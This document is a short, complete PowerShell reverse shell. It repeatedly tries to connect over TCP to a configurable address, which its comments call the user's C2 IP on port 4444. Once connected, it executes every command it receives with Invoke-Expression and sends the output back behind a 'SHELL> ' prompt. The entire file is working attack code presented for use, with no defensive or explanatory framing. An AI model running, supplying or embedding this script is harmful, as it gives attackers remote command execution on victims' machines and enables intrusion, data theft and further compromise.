# Hardcoded local IP and port (change these as needed)
$IPAddress = "127.0.0.1"   # e.g. localhost for testing, or your C2 IP
$Port      = 4444          # your local listening port

# Loop until connection is established
do {
    Start-Sleep -Seconds 1
    try {
        $TCPClient = New-Object Net.Sockets.TCPClient($IPAddress, $Port)
    } catch {}
} until ($TCPClient.Connected)

# Get network stream and create stream writer
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output
WriteToStream ''

# Main command loop
while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
   
    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }
   
    WriteToStream ($Output)
}

# Cleanup
$StreamWriter.Close()
$TCPClient.Close()